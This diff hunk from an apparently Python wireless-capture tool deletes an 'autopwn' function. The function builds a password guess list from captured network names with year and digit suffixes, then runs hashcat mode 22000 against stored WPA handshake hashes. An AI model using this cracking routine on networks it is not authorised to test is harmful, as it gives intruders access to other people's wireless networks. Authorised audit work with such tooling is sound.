@@ -215,64 +215,6 @@ def main():
         bench()
 
 
-def autopwn():
-
-    print("Generating smart wordlist")
-
-    conn = sqlite3.connect(DB)
-    cur = conn.cursor()
-
-    cur.execute("SELECT ssid FROM captures WHERE password IS NULL")
-
-    ssids = [row[0] for row in cur.fetchall() if row[0]]
-
-    conn.close()
-
-    wordlist = BASE / "tmp_autopwn.txt"
-
-    words = set()
-
-    for ssid in ssids:
-
-        base = ssid.lower()
-
-        clean = base.replace("-", "").replace("_", "")
-
-        words.add(base)
-        words.add(clean)
-
-        for year in ["2024", "2025", "2026"]:
-
-            words.add(base + year)
-            words.add(clean + year)
-
-        for num in ["123", "1234", "12345"]:
-
-            words.add(base + num)
-            words.add(clean + num)
-
-    with open(wordlist, "w") as f:
-
-        for w in words:
-
-            if len(w) >= 8:
-                f.write(w + "\n")
-
-    print(f"Generated {len(words)} candidates")
-
-    hash_files = glob.glob(str(BASE / "data/hashes" / "*.22000"))
-
-    if not hash_files:
-        print("No hash files found")
-        return
-
-    subprocess.run([
-        "hashcat",
-        "-m",
-        "22000",
-        *hash_files,
-        str(wordlist)
-    ])
 
 def watch():
 
